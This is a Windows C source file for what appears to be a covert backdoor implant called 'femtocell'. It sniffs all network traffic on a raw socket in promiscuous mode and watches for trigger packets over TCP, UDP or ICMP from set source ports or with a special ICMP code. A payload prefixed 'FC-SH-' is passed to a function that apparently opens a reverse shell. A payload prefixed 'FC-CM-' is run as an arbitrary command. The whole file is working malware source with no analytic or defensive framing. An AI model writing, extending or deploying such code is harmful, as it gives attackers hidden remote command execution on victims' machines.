#include "femtocell.h"

struct sockaddr_in* GetIP() {
	SOCKADDR_IN adress;
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct sockaddr_in remoteaddr = { 0 };
	remoteaddr.sin_family = AF_INET;
	remoteaddr.sin_addr.s_addr = inet_addr("8.8.8.8");
	remoteaddr.sin_port = htons(53);
	struct sockaddr_in localaddr = { 0 };
	struct sockaddr_in* ret = (struct sockaddr_in*)malloc(sizeof(struct sockaddr_in));

	if (connect(sock, (struct sockaddr*)&remoteaddr, sizeof(remoteaddr)) == 0)
	{
		int len = sizeof(localaddr);
		getsockname(sock, (struct sockaddr*)&localaddr, &len);
		memcpy(ret, &localaddr, len);
	}
	closesocket(sock);
	return ret;
}

void something(int payloadLength, char* data)
{
	if (payloadLength > 6)
					{
						if (strncmp(data, "FC-SH-", 6) == 0)
						{
							char* rip = (char*)data + 6;
							rev(rip);
						}
						else if (strncmp(data, "FC-CM-", 6) == 0)
						{
							char* cmd = (char*)data + 6;
							exec(cmd);
						}
					}
}

int main(int argc, char** argv) 
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET sd = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
	if (sd == INVALID_SOCKET) 
	{
#ifdef DEBUG
		fprintf(stderr, "socket() failed: %u", WSAGetLastError());
#endif
		exit(-1);
	}

	struct sockaddr_in* localaddr = GetIP();

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(argv[1]);
	addr.sin_port = htons(0);

	int rc = bind(sd, (struct sockaddr*)&addr, sizeof(addr));
	if (rc == SOCKET_ERROR) 
	{
#ifdef DEBUG
		fprintf(stderr, "bind() failed: %u", WSAGetLastError());
#endif
		exit(-1);
	}

	int value = RCVALL_IPLEVEL;
	DWORD out = 0;
	rc = WSAIoctl(sd, SIO_RCVALL, &value, sizeof(value), NULL, 0, &out, NULL, NULL);
	if (rc == SOCKET_ERROR) 
	{
#ifdef DEBUG
		fprintf(stderr, "WSAIoctl() failed: %u", WSAGetLastError());
#endif
		exit(-1);
	}

	unsigned char buffer[BUFFER_SIZE_ETH + BUFFER_SIZE_PKT];
	memset(buffer, 0, sizeof(buffer));
	buffer[BUFFER_OFFSET_ETH + 12] = 0x08;

	while (1) 
	{
		int rc = recv(sd, (char*)buffer + BUFFER_OFFSET_IP, BUFFER_SIZE_IP, 0);
		if (rc == SOCKET_ERROR) 
		{
#ifdef DEBUG
			fprintf(stderr, "recv() failed: %u", WSAGetLastError());
#endif
			exit(-1);
		}

		struct ip_hdr_s* ip_header = (buffer+BUFFER_OFFSET_IP);
		uint8_t l4_protocol = ip_header->ip_p;
		if (l4_protocol == IPPROTO_TCP) 
		{
			struct tcp_hdr_s* tcp_header = (buffer + BUFFER_OFFSET_L4);
			uint16_t sport = ntohs(tcp_header->th_sport);
			if (sport == SRC_PORT || sport == SRC_PORT_2)
			{
				uint16_t flag = (uint16_t)tcp_header->th_flags;
				if (flag >> 3 % 2) 
				{
					char* data = (char*)(buffer + BUFFER_OFFSET_TCP_DATA);
					int buffoffdata = BUFFER_SIZE_TCP;
					int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_TCP;
					data[payloadLength - 1] = '\0';

					something(payloadLength, data);
				}
			}
		}
		else if (l4_protocol == IPPROTO_UDP)
		{
			struct udp_hdr_s* udp_header = (buffer + BUFFER_OFFSET_L4);
			uint16_t sport = ntohs(udp_header->source);
			if (sport == SRC_PORT || sport == SRC_PORT_2)
			{
				char* data = (char*)(buffer + BUFFER_OFFSET_UDP_DATA);
				int buffoffdata = BUFFER_SIZE_UDP;
				int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_UDP;
				data[payloadLength - 1] = '\0';	

				something(payloadLength, data);
			}

		}
		else if (l4_protocol == IPPROTO_ICMP)
		{
			struct icmp_hdr_s* icmp_header = (buffer + BUFFER_OFFSET_L4);	
			uint8_t scode = icmp_header->code;
			uint8_t stype = icmp_header->type;
			if (scode == 1 && stype == 8)
			{
				char* data = (char*)(buffer + BUFFER_OFFSET_ICMP_DATA);
				int buffoffdata = BUFFER_SIZE_ICMP;
				int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_ICMP;
				data[payloadLength - 1] = '\0';	

				something(payloadLength, data);
			}

		}
	}
	return 0;
}

